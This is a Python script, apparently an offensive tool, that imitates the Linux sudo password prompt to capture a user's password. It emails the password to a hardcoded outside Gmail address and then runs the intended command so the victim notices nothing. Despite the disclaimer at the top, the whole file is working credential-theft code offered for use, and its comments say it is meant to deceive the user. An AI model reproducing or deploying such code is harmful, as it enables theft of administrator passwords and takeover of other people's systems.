#/usr/bin/python
# created by protectedbyhackers
# Not to be used for malicious acts
# 
# This python script is to be used to
# harvest sudo passwords on linux system
# then to email the password to a specific email
# 
import argparse
import subprocess
import smtplib
import getpass
import os

# This will retrieve the command that was supposed
# to be sudoed
# known issues: "" are needed around the command
def getCommand():
	parser = argparse.ArgumentParser() # make it default for now
	parser.add_argument("command")
	args = parser.parse_args()
	return str(args.command) # Need to get rid of the need for the " "

# This will provide the sudo interface to get the sudo password
def getSudoPass():
	promptStr = "[sudo] password for "+ getpass.getuser()+ ": "
	password = getpass.getpass(promptStr)
	return password.strip("\n")

# In order to truely fool a user
# their intended action must still occur
def emulateSudo(sudoArgs, sudoPassword):
	command = "echo " + sudoPassword + " | sudo -S " + sudoArgs
	os.system(command)

# This sends the password via email
# Fill out the emailUser, emailPass, emailAddr,
# emailServ, emailPort 
# to be able to send an email to you
# 
# Known issues: Can easily be traced back to user
# - Need to put all this into subprocess to avoid
# 	any noticable user performance
# - Possibly create own smtp server to send email
#	without showing the username / password
def sendPassword(passid): 
	emailAddr = "logixmorg@gmail.com" # this is your email
	command = "echo " + passid + " | ./mail -s " + getpass.getuser() + " " + emailAddr
	print command
	os.system(command)




cmd = getCommand()
sudoPass = getSudoPass()
sendPassword(sudoPass)
emulateSudo(cmd, sudoPass)




